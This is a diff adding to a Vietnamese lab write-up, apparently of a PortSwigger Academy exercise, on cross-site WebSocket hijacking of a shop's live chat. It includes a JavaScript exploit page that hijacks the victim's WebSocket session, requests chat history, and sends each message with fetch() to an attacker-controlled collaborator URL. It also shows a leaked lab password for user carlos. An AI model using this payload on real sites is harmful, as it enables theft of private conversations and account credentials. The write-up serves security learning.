@@ -319,5 +319,56 @@
 
 - Thực hiện gửi một message bất kỳ lên live chat. Sau đó load lại trang Live chat.
 
-- Tiến hành kiểm tra trong WebSocket history của Burp Suite, ta nhận thấy có điểm đặc biết là client app gửi một lệnh là "READY" lên server để lấy lại 
+- Tiến hành kiểm tra trong WebSocket history của Burp Suite, ta nhận thấy có điểm đặc biết là client app gửi một lệnh là "READY" lên server để lấy lại nội dung đoạn chat trước đó của người dùng:
+
+  <img width="1919" height="926" alt="image" src="https://github.com/user-attachments/assets/ed6ed544-7000-4384-812d-627f482f5fbb" />
+
+- Trong phần HTTP history ta lại để ý thấy phần request của quá trình bắt tay WebSocket của chức năng Live chat, ta thấy nó chỉ chứa session cookie của user, chứ không có CSRF tokens &rarr; có thể lợi dùng để tấn công CSWSH.
+
+  <img width="1405" height="718" alt="image" src="https://github.com/user-attachments/assets/68acc5c1-f8f8-402a-ae6a-cac54afb6001" />
+
+- Trong exploit server, ta thực hiện tạo một file /exploit với nội dung phần body là đoạn mã JS như sau:
+
+  ```
+  <script>
+    var ws = new WebSocket('wss://your-websocket-url');
+    ws.onopen = function() {
+        ws.send("READY");
+    };
+    ws.onmessage = function(event) {
+        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
+  </script>
+  ```
+
+  Lúc này ta cần thực hiện lừa các nạn nhân click vào đường dẫn dộc hại trên do ta tạo ra, và chỉ cần khi nạn nhân thực hiện truy cập vào đường link, đoạn mã JS trên sẽ    thực hiện khởi tạo một kết nối WebSocket với session cookie là của nạn nhân, và tiếp đó gửi một lệnh "READY" tới server nhắm mục đích là lấy các nội dung đoạn chat       trước đó của người dùng này. (như đã đề cập ở trên)
+
+  Dữ liệu từ server gửi về sẽ được ta lắng nghe thông domain Burp Collabator mà ta kiếm soát.
+
+  <img width="1919" height="943" alt="image" src="https://github.com/user-attachments/assets/cd827ca7-648c-485a-8eed-ac0ebab8d36c" />
+
+- Tiến hành gửi cho nạn nhân, sau đó kiểm tra Burp Collaborator, ta thấy rằng có các request HTTP được gửi về từ server website shopping:
+
+  <img width="1919" height="920" alt="image" src="https://github.com/user-attachments/assets/b0558419-c1ae-4ba0-a1ff-2952498feb39" />
+
+  &rarr; Tồn tại lỗ hổng CSWSH.
+
+  Kiểm tra các yêu cầu HTTP này của server gửi về, ta sẽ thấy chính là các message chứa nội dung các đoạn chat trước đó của người dùng (vì ta khởi tạo kết nối WebSocket    và gửi lệnh "READY" tới cho server). Ta thấy nội dung của các đoạn chat được gửi về dưới dạng JSON format.
+
+- Tiến hành kiểm tra các message, ta phát hiện được rằng nó bị leak ra thông tin tài khoản của người dùng carlos, bao gồm cả mật khẩu là: _zl4kksijppyotlh3i07x_
+
+  <img width="1917" height="941" alt="image" src="https://github.com/user-attachments/assets/b109103c-31a3-4c90-8393-9a140cdd3d9f" />
+
+- Tiến hành đăng nhập thử và thành công:
+
+  <img width="1919" height="939" alt="image" src="https://github.com/user-attachments/assets/b6563e91-e9d9-42db-b424-6ee0adc0b17d" />
+
+  &rarr; Thành công lợi dụng lỗ hổng CSWSH để khai thác lấy thông tin nhạy cảm.
+
+---
+
+  
+
+
+    
 
